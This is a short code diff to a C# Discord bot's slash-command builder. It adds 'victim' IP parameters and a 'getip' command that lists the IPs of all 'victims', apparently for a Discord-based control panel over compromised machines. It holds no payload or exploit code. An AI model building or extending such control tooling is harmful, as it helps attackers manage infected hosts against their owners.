@@ -28,15 +28,26 @@ public struct CommandBuilder
             Name = "ping",
             Description = "Get the last heartbeat from the Gateway to our bot"
         };
+        pingCommand.AddOption("victim", ApplicationCommandOptionType.String, "the Ip of the victim", true, false, true);
 
         SlashCommandBuilder rebuildCmd = new()
         {
             Name = "rebuildcmd",
             Description = "Rebuild the available slash commands"
         };
+        rebuildCmd.AddOption("victim", ApplicationCommandOptionType.String, "the Ip of the victim", true, false);
+
+        SlashCommandBuilder getIp = new()
+        {
+            Name = "getip",
+            Description = "Get the IP of all the victims"
+        };
+
 
         commands.Add(pingCommand.Build());
         commands.Add(rebuildCmd.Build());
+        commands.Add(getIp.Build());
+
 
         return commands;
     }
